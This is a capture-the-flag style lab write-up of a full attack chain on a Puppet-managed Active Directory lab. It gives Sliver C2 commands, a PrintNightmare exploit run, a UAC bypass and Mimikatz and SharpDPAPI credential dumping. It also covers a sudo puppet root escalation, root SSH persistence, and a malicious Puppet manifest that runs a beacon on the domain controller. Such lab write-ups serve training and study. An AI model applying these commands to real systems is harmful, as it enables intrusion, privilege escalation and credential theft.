# Puppet Pro-Lab — Full Chain Writeup

**Difficulty**: Medium  
**Category**: Pro-Lab Chain (Active Directory + Puppet Configuration Management)  
**Tools**: Sliver C2, PrintNightmare, Mimikatz, SharpDPAPI, ssh2john, Puppet

## Network Topology

```
Attacker (10.13.38.1)
    │
    ├── socat 127.0.0.1:31337 ↔ 10.13.38.33:31337
    │
    ▼
PM01 (10.13.38.33)  ← Puppet Master / Sliver Server
    ├── Port 21    → FTP anonymous (sliver client + config)
    ├── Port 22    → SSH
    ├── Port 8443  → Sliver mTLS (beacon callback)
    ├── Port 31337 → Sliver mTLS (multiplayer client)
    └── Port 8140  → Puppet master (WEBrick, Ruby 3.0.2)
        │
        ├── puppet agent → FILE01 (10.13.38.32)  — svc_puppet_win_t1
        │   └── `files` SMB share ← payload staged here
        └── puppet agent → DC01 (10.13.38.??)    — svc_puppet_win_t0
```

## Phase 1: Initial Access — Sliver C2

### PM01 Reconnaissance

Only PM01 is reachable from the starting position. Nmap reveals:

```
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.5
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu
8140/tcp  open  ssl/http   WEBrick httpd 1.7.0 (Ruby 3.0.2)
31337/tcp open  ssl/Elite? Sliver multiplayer endpoint
```

### FTP — Anonymous Access

```
$ ftp 10.13.38.33
Name: anonymous
Password: <any>
ftp> ls
-rw----r--    1 0        0            2119  red_127.0.0.1.cfg
-rwxr-xr-x    1 0        0        36515304  sliver-client_linux
```

Two critical files: the Sliver multiplayer config and the client binary.

### Connect to the C2

The config points to `127.0.0.1:31337` — pivot traffic to PM01:

```
$ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
```

Import config and connect:

```
$ ./sliver-client_linux import ./red_127.0.0.1.cfg
$ ./sliver-client_linux
```

List the existing beacon:

```
sliver > beacons

 ID         Name          Transport   Hostname   Username             OS
========== ============= =========== ========== ==================== ===============
 56d068c7   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith   windows/amd64
```

### First Flag

```
sliver > use 56d068c7
sliver > ls C:\Users\bruce.smith\Desktop\
flag.txt
sliver > cat C:\Users\bruce.smith\Desktop\flag.txt
PUppET{1c1740d66f707111a911e5f6a96d7d36}
```

**Flag #1**: `PUppET{1c1740d66f707111a911e5f6a96d7d36}`

## Phase 2: Target Reconnaissance

### Puppet Installation

Browse the filesystem — Puppet is installed:

```
sliver > cd C:\ProgramData
sliver > ls
drwxrwxrwx Puppet        <dir>
drwxrwxrwx PuppetLabs    <dir>
```

The beacon itself is `C:\ProgramData\Puppet\puppet-update.exe`, launched by a watchdog script `puppet.ps1` that re-spawns it every 30 seconds.

### Active Directory Enumeration — BloodHound

```
sliver > cd C:\Temp
sliver > sharp-hound-4 -s -t 300 -- -c all,gpolocalgroup
sliver > download 20241017043355_BloodHound.zip
```

No obvious privilege escalation paths in BloodHound. ADCS is also absent:

```
sliver > sa-adcs-enum
[*] Found 0 CAs in the domain
```

### SMB Share Enumeration

```
sliver > sa-netshares file01
ADMIN$
C$
files
IPC$

sliver > sa-dir \\file01\files\IT
puppet-agent-x64-latest.msi
```

## Phase 3: Privilege Escalation to SYSTEM

### PrivescCheck

Upload and run PrivescCheck:

```
sliver > upload PrivescCheck.ps1 C:\Temp\
sliver > sharpsh -t 300 -- -c invoke-privesccheck -u C:\Temp\PrivescCheck.ps1
```

Key finding — PrintNightmare vulnerability:

```
Policy      : Limits print driver installation to Administrators
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : RestrictDriverInstallationToAdministrators
Data        : 0
Expected    : <null|1>
Status      : Vulnerable - High
```

### PrintNightmare Exploitation (CVE-2021-34527)

Upload John Hammond's PoC:

```
sliver > upload CVE-2021-34527.ps1 C:\Temp\
sliver > sharpsh -i -s -t 1000 -- -u C:\Temp\CVE-2021-34527.ps1 -c Invoke-Nightmare
```

This creates a local admin user `adm1n:P@ssw0rd` via the embedded DLL.

Spawn a beacon as the new admin:

```
sliver > runas -u adm1n -P "P@ssw0rd" -p C:\ProgramData\Puppet\puppet-update.exe
[*] Beacon 913973f8 ... (File01) - windows/amd64
```

This beacon has admin group membership but **Medium integrity** due to UAC.

### UAC Bypass

Compile and load the `SspiUacBypass` BOF from [UAC-BOF-Bonanza](https://github.com/icyguider/UAC-BOF-Bonanza):

```
$ cp -rp SspiUacBypass /root/.sliver-client/extensions/
$ cd /root/.sliver-client/extensions/SspiUacBypass/; make
```

From the Sliver CLI:

```
sliver > extensions load /path/to/SspiUacBypass
sliver > SspiUacBypass C:\ProgramData\Puppet\puppet-update.exe
```

This creates a forged network authentication token (via SSPI datagram contexts), then uses it to create a service running as SYSTEM. A new beacon appears:

```
[*] Beacon 15d1aae2 puppet-mtls - 10.10.144.230:51531 (File01) - windows/amd64 - NT AUTHORITY\SYSTEM
```

### Credential Dumping — Mimikatz

From the SYSTEM beacon, sideload Mimikatz:

```
sliver > use 15d1aae2
sliver > sideload /path/to/mimikatz.exe "token::elevate privilege::debug sekurlsa::logonpasswords exit"
```

Output reveals the `svc_puppet_win_t1` credentials:

```
msv:
[00000003] Primary
* Username : svc_puppet_win_t1
* Domain   : PUPPET
* NTLM     : 784c****
```

## Phase 4: Lateral Movement — svc_puppet_win_t1

### Accessing the DC IT Share

The SYSTEM beacon (FILE01$) cannot access `\\dc01.it\`. We need the `svc_puppet_win_t1` context.

Option A — Service Hijack (intrusive): Change puppet service binary path

```
sliver > execute -o -s -- C:\Windows\System32\cmd.exe /c sc config puppet binPath=C:\ProgramData\Puppet\puppet-update.exe
sliver > execute -o -s -- C:\Windows\System32\cmd.exe /c powershell -c "Restart-Service -Name puppet"
[*] Beacon from svc_puppet_win_t1 appears
```

Restore the original path afterward:

```
sliver > execute -o -s -- C:\Windows\System32\cmd.exe /c sc config puppet binPath="\"C:\Program Files\Puppet Labs\Puppet\sys\ruby\bin\ruby.exe\" -rubygems \"C:\Program Files\Puppet Labs\Puppet\service\daemon.rb\""
```

Option B — Process Migration (stealthier):

```
sliver > ps | grep ruby.exe
4832   656    PUPPET\svc_puppet_win_t1       x86_64   ruby.exe

sliver > migrate -p 4832
[*] Successfully migrated to 4832
```

### Domain Controller Share Enumeration

From the svc_puppet_win_t1 beacon:

```
sliver > ls \\dc01.puppet.vl\it
.ssh/          <dir>
firewalls/     <dir>
PsExec64.exe   813.9 KiB

sliver > ls \\dc01.puppet.vl\it\.ssh
ed25519       472 B
ed25519.pub   108 B

sliver > download \\dc01.puppet.vl\it\.ssh\ed25519
sliver > download \\dc01.puppet.vl\it\.ssh\ed25519.pub
```

The public key reveals the owner:

```
$ cat ed25519.pub
ssh-ed25519 ... svc_puppet_lin_t1@puppet.vl
```

## Phase 5: Linux Pivot — Puppet Master Root

### SSH Key Cracking

The private key is passphrase-protected. Use ssh2john + rockyou:

```
$ ssh2john ed25519 > hash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### SSH to PM01 via Port Forward

```
sliver > portfwd add --bind 2222 -r 10.13.38.33:22
[*] Port forwarding 0.0.0.0:2222 -> 10.13.38.33:22

$ dos2unix ed25519
$ chmod 600 ed25519
$ ssh -i ed25519 -t 'svc_puppet_lin_t1@puppet.vl'@127.0.0.1 -p 2222
```

### sudo Privilege Escalation

```
svc_puppet_lin_t1@puppet.vl@puppet:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/puppet
```

Puppet apply can execute arbitrary commands as root via GTFOBins:

```
$ sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"
$ bash -p
bash-5.1# id
euid=0(root)
```

Add SSH key for persistence:

```
bash-5.1# mkdir -p /root/.ssh
bash-5.1# echo '<pub_key>' >> /root/.ssh/authorized_keys
```

## Phase 6: Domain Controller via Puppet Manifest

### Puppet Certificate Enumeration

```
bash-5.1# puppet cert list --all
- "dc01.puppet.vl"   (SHA256) E4:C3:...
- "file01.puppet.vl" (SHA256) 61:ED:...
- "puppet.puppet.vl" (SHA256) 11:65:...
```

Both FILE01 and DC01 are managed by this Puppet master.

### Malicious Manifest

Create a site.pp that tells DC01 to execute a beacon:

```
$ mkdir -p /etc/puppet/code/environments/production/manifests

$ cat > /etc/puppet/code/environments/production/manifests/site.pp << 'EOF'
node 'dc01.puppet.vl' {
  exec { 'pwned':
    command   => 'C:\Windows\System32\cmd.exe /c \\file01.puppet.vl\files\update.exe',
    logoutput => true,
  }
}
node default {
  notify { 'This is the default node': }
}
EOF
```

### Staging the Payload

Place the Sliver beacon on the `files` SMB share on FILE01 so DC01 can reach it. From an existing beacon on FILE01, use the `shell` command and PowerShell:

```
sliver (puppet-mtls) > shell
[*] Opening shell tunnel (EOF to exit) ...

PS C:\programdata\puppet> powershell -Command "Copy-Item -Path 'C:\ProgramData\puppet\puppet-update.exe' -Destination '\\file01.puppet.vl\files\puppet-update.exe'"
```

### Trigger

```
$ puppet apply /etc/puppet/code/environments/production/manifests/site.pp
```

DC01's Puppet agent checks in every ~60 seconds and picks up the manifest. Shortly after:

```
[*] Beacon 66b57ae6 puppet-mtls - 10.13.38.??:63253 (DC01) - windows/amd64

sliver > use 66b57ae6
sliver > sa-whoami
UserName              SID
===================== ====================================
PUPPET\svc_puppet_win_t0 S-1-5-21-...-1602
```

### Final Flag — DC01

Check the Administrator's Desktop:

```
sliver > ls C:\Users\Administrator\Desktop
-rw-rw-rw-  desktop.ini         282 B
-rw-rw-rw-  Microsoft Edge.lnk  2.3 KiB
-rw-rw-rw-  root.txt            5.2 KiB

sliver > cat C:\Users\Administrator\Desktop\root.txt
The final flag is the password of the user "PUPPET\root".
```

The flag is not a file — it's the password of the `PUPPET\root` user. Mimikatz won't help here if the password isn't cached in LSASS under the current context. Instead, use SharpDPAPI to decrypt machine-protected DPAPI credential blobs:

```
sliver > sharpdpapi machinetriage
```

Among the output, look for a DPAPI blob in `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials`:

```
Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 39FAB9BA3A19E88594B1D50B5E44AAA4
    guidMasterKey    : {e2de4c34-...}
    LastWritten      : 10/12/2024 1:44:00 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{ACFD7F3B-...}
    UserName         : PUPPET\root
    Credential       : <FLAG>
```

The `Credential` field contains the plaintext password for `PUPPET\root` — this is **Flag #2**.

**Flag #2** (Root): `PUPPET\root` user password extracted via SharpDPAPI on DC01.

## Summary

| Step | Host | User | Technique | Outcome |
|------|------|------|-----------|---------|
| 1 | PM01 | anonymous | FTP anon | Sliver client + config |
| 2 | FILE01 | Bruce.Smith | Existing beacon | Flag #1 |
| 3 | FILE01 | Bruce.Smith | BloodHound | AD map (no obvious paths) |
| 4 | FILE01 | Bruce.Smith | PrivescCheck | PrintNightmare vuln |
| 5 | FILE01 | → adm1n | CVE-2021-34527 | Local admin user |
| 6 | FILE01 | → SYSTEM | SspiUacBypass BOF | Elevated beacon |
| 7 | FILE01 | SYSTEM | Mimikatz sideload | svc_puppet_win_t1 creds |
| 8 | FILE01 | → svc_puppet_win_t1 | Migrate to ruby.exe | Puppet service context |
| 9 | DC01 | svc_puppet_win_t1 | SMB share enum | ed25519 SSH key |
| 10 | PM01 | → root | ssh2john + sudo puppet | Puppet master root |
| 11 | DC01 | → svc_puppet_win_t0 | Malicious site.pp | DC beacon |
| 12 | DC01 | svc_puppet_win_t0 | SharpDPAPI machinetriage | Flag #2 (PUPPET\root password) |

## Tool & Command Reference

### Sliver BOFs / Aliases Used
| Command | Purpose |
|---------|---------|
| `sa-whoami` | Current user + privileges |
| `sa-netshares <host>` | Enumerate SMB shares |
| `sa-dir \\<host>\<share>` | List SMB share contents |
| `sa-sc-enum` | List all services |
| `sa-sc-query <host> <service>` | Get service details |
| `sa-adcs-enum` | Check for ADCS |
| `sa-netstat` | Network connections |
| `sharp-hound-4` | BloodHound collector |
| `sharpsh` | PowerShell runner inline |
| `sideload` | PE loader (Mimikatz) |
| `migrate` | Process injection |
| `portfwd` | TCP port forwarding |
| `runas` | Create process as user |
| `armory install mimikatz` | Install Mimikatz |
| `sharpdpapi` | DPAPI credential extraction (final flag) |
| `shell` | Interactive cmd.exe shell (file copy ops) |

### Key File Paths
| Path | Purpose |
|------|---------|
| `C:\ProgramData\Puppet\puppet-update.exe` | Sliver beacon binary |
| `C:\ProgramData\Puppet\puppet.ps1` | Watchdog (re-spawns beacon) |
| `C:\ProgramData\PuppetLabs\` | Puppet agent installation |
| `C:\Program Files\Puppet Labs\Puppet\sys\ruby\bin\ruby.exe` | Puppet service binary |
| `\\dc01.puppet.vl\it\.ssh\ed25519` | SSH key for svc_puppet_lin_t1 |
| `\\file01.puppet.vl\files\IT\puppet-agent-x64-latest.msi` | Puppet agent installer |
| `\\file01.puppet.vl\files\puppet-update.exe` | Sliver beacon staged for DC01 |
| `C:\Users\Administrator\Desktop\root.txt` | Hint: "final flag is PUPPET\root password" |
| `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\` | DPAPI blobs with PUPPET\root credential |

### Registry Check for PrintNightmare
```
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
  RestrictDriverInstallationToAdministrators = 0   ← vulnerable
  NoWarningNoElevationOnInstall              = 1   ← vulnerable
```

## Lessons Learned

1. **Sliver multiplayer mode** allows C2 operations without direct shell access to the server — only the client config is needed.
2. **PrintNightmare** remains one of the most reliable Windows LPE paths when the registry hardening is missing.
3. **UAC bypass via SSPI** (SspiUacBypass BOF) is effective against default Windows UAC.
4. **Puppet configuration management** is a powerful lateral movement vector — any managed node can be compromised by modifying its manifest.
5. **The Puppet agent's check-in interval** determines exploitation speed (here: ~60s, default is 30min).
6. **Process migration** to an existing service process is stealthier than service binary hijacking (which may break the service).
7. **The final flag is often NOT a file** — in this case, `root.txt` points to `PUPPET\root`'s password, extracted via SharpDPAPI from a scheduled task DPAPI blob.
8. **SharpDPAPI machinetriage** decrypts machine-protected DPAPI blobs — crucial when Mimikatz can't find the target credential in LSASS memory.
